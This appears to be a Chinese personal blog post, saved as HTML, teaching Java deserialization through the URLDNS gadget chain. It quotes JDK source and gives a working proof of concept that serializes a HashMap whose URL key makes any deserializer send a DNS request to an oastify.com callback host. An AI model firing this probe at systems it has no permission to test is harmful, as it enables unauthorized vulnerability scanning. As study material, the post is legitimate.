@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>java反序列化 — URLDNS链 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="小白终于开始Java反序列化了😭
+
+一些前置知识
+
+java反序列化三要素（入口类，调用链，执行类（利用点））
+
+入口类（source）：重写readObject，调用常见函数，参数类型广泛，最好jdk自带。
+调用链（gadget cha..." />
+    <meta name="keywords" content="java,反序列化" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">java反序列化 — URLDNS链</h2>
+            <div class="post-date">2022-11-07</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/java-fan-xu-lie-hua-urldns-lian.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>小白终于开始Java反序列化了😭</p>
+<!-- more -->
+<h1 id="一些前置知识">一些前置知识</h1>
+<!-- more -->
+<p>java反序列化三要素（入口类，调用链，执行类（利用点））</p>
+<ul>
+<li>入口类（source）：重写readObject，调用常见函数，参数类型广泛，最好jdk自带。</li>
+<li>调用链（gadget chain）：找相同方法。</li>
+<li>执行类（sink）：rce，ssrf，读写文件等。</li>
+</ul>
+<p>注：<br>
+实现了java.io.Serializable接口的类可以定义如下(魔术方法)，在类序列化和反序列化过程中调用：<br>
+private void writeObject(ObjectOutputStream oos),自定义序列化<br>
+private void readObject(ObjectInputStream ois),自定义反序列化</p>
+<p>readObject()方法被重写的的话，反序列化该类时自动调用重写后的readObject()方法。如果该方法书写不当的话将引发恶意代码的执行：</p>
+<p>Read.java:</p>
+<pre><code>package ReadObject;
+
+import java.io.Serializable;
+
+public class Read implements Serializable{
+
+    private void readObject(java.io.ObjectInputStream s){
+        System.out.println(&quot;success&quot;);
+    }
+
+}
+</code></pre>
+<!-- more -->
+<p>Se.java:</p>
+<pre><code>package ReadObject;
+
+import java.io.*;
+
+public class Se {
+    public static void main(String[] args) throws IOException {
+        Read read = new Read();
+        serialize(read);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+}
+</code></pre>
+<!-- more -->
+<p>Unse.java:</p>
+<pre><code>package ReadObject;
+
+import java.io.*;
+
+public class Unse {
+    public static void main(String[] arge) throws IOException, ClassNotFoundException {
+        System.out.println(unserialize(&quot;ser.bin&quot;));
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1667814168878.png" alt="" loading="lazy"></figure>
+<!-- more -->
+<h1 id="urldns">URLDNS</h1>
+<!-- more -->
+<p>URLDN链，通常用于检查是否存在反序列化漏洞。(环境JDK1.8)<br>
+特点：</p>
+<ul>
+<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
+<li>使用java内置类构造，无第三方库依赖</li>
+</ul>
+<!-- more -->
+<p>入口类：HashMap（重写了readObject()，jdk自带，调用常见函数hashCode()）<br>
+调用链：HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()<br>
+执行类：java.net.URL</p>
+<p>HashMap#readObject:</p>
+<pre><code>private void readObject(java.io.ObjectInputStream s)
+        throws IOException, ClassNotFoundException {
+        // Read in the threshold (ignored), loadfactor, and any hidden stuff
+        s.defaultReadObject();
+        reinitialize();
+        if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))
+            throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                             loadFactor);
+        s.readInt();                // Read and ignore number of buckets
+        int mappings = s.readInt(); // Read number of mappings (size)
+        if (mappings &lt; 0)
+            throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
+                                             mappings);
+        else if (mappings &gt; 0) { // (if zero, use defaults)
+            // Size the table using given load factor only if within
+            // range of 0.25...4.0
+            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+            float fc = (float)mappings / lf + 1.0f;
+            int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
+                       DEFAULT_INITIAL_CAPACITY :
+                       (fc &gt;= MAXIMUM_CAPACITY) ?
+                       MAXIMUM_CAPACITY :
+                       tableSizeFor((int)fc));
+            float ft = (float)cap * lf;
+            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
+                         (int)ft : Integer.MAX_VALUE);
+            @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})
+                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
+            table = tab;
+
+            // Read the keys and values, and put the mappings in the HashMap
+            for (int i = 0; i &lt; mappings; i++) {
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    K key = (K) s.readObject();
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false);
+            }
+        }
+    }
+</code></pre>
+<p>反序列化时调用putVal()方法，该方法是设置键值对的，然后该方法里面又调用了hash()方法，跟进hash()方法。<br>
+HashMap#hash:</p>
+<pre><code> static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    }
+</code></pre>
+<p>发现调用了key.hashCode()方法，key为构造的URL执行类。跟进URl.hashCode()方法。<br>
+URl#hashCode：</p>
+<pre><code>public synchronized int hashCode() {
+        if (hashCode != -1)
+            return hashCode;
+
+        hashCode = handler.hashCode(this);
+        return hashCode;
+    }
+private int hashCode = -1;
+</code></pre>
+<p>当hashCode为-1时调用handler.hashCode()，跟进handler。<br>
+URl#handler:</p>
+<pre><code>transient URLStreamHandler handler;
+</code></pre>
+<p>继续跟进URLStreamHandler。<br>
+URLStreamHandler#hashCode:</p>
+<pre><code>protected int hashCode(URL u) {
+        int h = 0;
+
+        // Generate the protocol part.
+        String protocol = u.getProtocol();
+        if (protocol != null)
+            h += protocol.hashCode();
+
+        // Generate the host part.
+        InetAddress addr = getHostAddress(u);
+        if (addr != null) {
+            h += addr.hashCode();
+        } else {
+            String host = u.getHost();
+            if (host != null)
+                h += host.toLowerCase().hashCode();
+        }
+
+        // Generate the file part.
+        String file = u.getFile();
+        if (file != null)
+            h += file.hashCode();
+
+        // Generate the port part.
+        if (u.getPort() == -1)
+            h += getDefaultPort();
+        else
+            h += u.getPort();
+
+        // Generate the ref part.
+        String ref = u.getRef();
+        if (ref != null)
+            h += ref.hashCode();
+
+        return h;
+    }
+</code></pre>
+<p>在getHostAddress中进行了dns查询<br>
+URLStreamHandler#getHostAddress:</p>
+<pre><code>protected synchronized InetAddress getHostAddress(URL u) {
+        if (u.hostAddress != null)
+            return u.hostAddress;
+
+        String host = u.getHost();
+        if (host == null || host.equals(&quot;&quot;)) {
+            return null;
+        } else {
+            try {
+                u.hostAddress = InetAddress.getByName(host);
+            } catch (UnknownHostException ex) {
+                return null;
+            } catch (SecurityException se) {
+                return null;
+            }
+        }
+        return u.hostAddress;
+    }
+</code></pre>
+<p>InetAddress.getByName(&quot;域名&quot;)，在给定域名的情况下进行dns解析。</p>
+<!-- more -->
+<p>poc:</p>
+<pre><code>package Url_Dns;
+
+import java.io.*;
+import java.net.URL;
+import java.util.HashMap;
+import java.lang.reflect.Field;
+
+
+
+
+public class Se {
+    public static void main(String[] args) throws Exception {
+
+//        入口类
+        HashMap&lt;URL,Integer&gt; h = new HashMap&lt;URL,Integer&gt;();
+        URL url = new URL(&quot;http://ukixerbs5nrw2zrha6rcqgm73y9pxe.oastify.com&quot;);
+
+//        改变url对象的属性hashcode去掉序列化前的dns请求
+        Class urlClass = url.getClass();
+        Field name = urlClass.getDeclaredField(&quot;hashCode&quot;);
+        name.setAccessible(true);
+        name.set(url,123);
+        System.out.println(name.get(url));
+
+        h.put(url,1);//序列化时put()里因为hashCode为-1（默认）将在hashCode()中发起一次dns请求
+
+        name.set(url,-1);
+        System.out.println(name.get(url));
+        serialize(h);
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+}
+</code></pre>
+<pre><code>package Url_Dns;
+
+import java.io.*;
+
+public class Un_Se {
+    public static void main(String[] args) throws Exception {
+
+        System.out.println(unserialize(&quot;ser.bin&quot;));
+
+    }
+    public static Object unserialize(String name) throws IOException, ClassNotFoundException {
+        ObjectInputStream obj = new ObjectInputStream(new FileInputStream(name));
+        Object obj1 = obj.readObject();
+        return obj1;
+    }
+
+}
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1667819242120.png" alt="" loading="lazy"><br>
+参考连接：https://xz.aliyun.com/t/9417#toc-3</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
+                    java
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/OtQMAvCGr3/" class="tag">
+                    反序列化
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/yang-cheng-bei-2020easyser/">
+                  <h3 class="post-title">
+                    [羊城杯 2020]easyser
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
